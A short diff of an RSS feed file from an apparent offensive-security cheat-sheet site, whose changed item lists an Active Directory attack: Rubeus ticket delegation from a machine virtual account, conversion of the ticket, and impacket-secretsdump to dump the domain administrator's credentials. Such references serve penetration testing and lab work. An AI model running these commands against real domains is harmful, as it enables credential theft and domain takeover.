@@ -40,7 +40,7 @@
       <link>https://tldrbins.github.io/machine_account/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/machine_account/</guid>
-      <description>Abuse #1: Microsoft virtual account 1. Create a ticket from Microsoft virtual account Windows .\rubeus.exe tgtdeleg /nowrap /ptt 2. Secrets Dump Linux Windows 3. Convert kirbi to ccache python3 rubeustoccache.py &amp;lt;BASE64_TICKET&amp;gt; secrets.kirbi secrets.ccache 4. Secrets Dump export KRB5CCNAME=secrets.ccache sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-secretsdump -k -no-pass -just-dc-user administrator Ref: RubeusToCcache&#xA;TO-DO</description>
+      <description>Abuse #1: Microsoft virtual account 1. Create a ticket from Microsoft virtual account Windows .\rubeus.exe tgtdeleg /nowrap /ptt 2. Secrets Dump Linux Windows 3. Convert kirbi to ccache python3 rubeustoccache.py &amp;lt;BASE64_TICKET&amp;gt; secrets.kirbi secrets.ccache 4. Secrets Dump export KRB5CCNAME=secrets.ccache sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-secretsdump -k -no-pass -just-dc-user administrator Ref: RubeusToCcache&#xA;1. TO-DO TO-DO </description>
     </item>
     <item>
       <title>NetExec (nxc)</title>
